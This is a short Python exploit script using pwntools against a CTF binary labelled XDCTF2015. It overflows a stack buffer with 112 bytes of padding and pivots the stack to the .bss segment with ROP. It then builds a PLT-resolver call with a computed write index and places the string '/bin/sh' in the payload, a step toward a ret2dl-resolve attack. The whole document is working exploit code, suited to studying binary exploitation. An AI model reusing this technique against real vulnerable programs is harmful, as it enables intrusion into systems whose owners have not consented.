from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment
# new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
## padding
rop.raw('a' * offset)
## read 100 byte to base_stage
rop.read(0, base_stage, 100)
## stack privot, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
write_index = (elf.plt['write'] - plt0) / 16 - 1
write_index *= 8
rop.raw(plt0)
rop.raw(write_index)
# fake ret addr of write
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
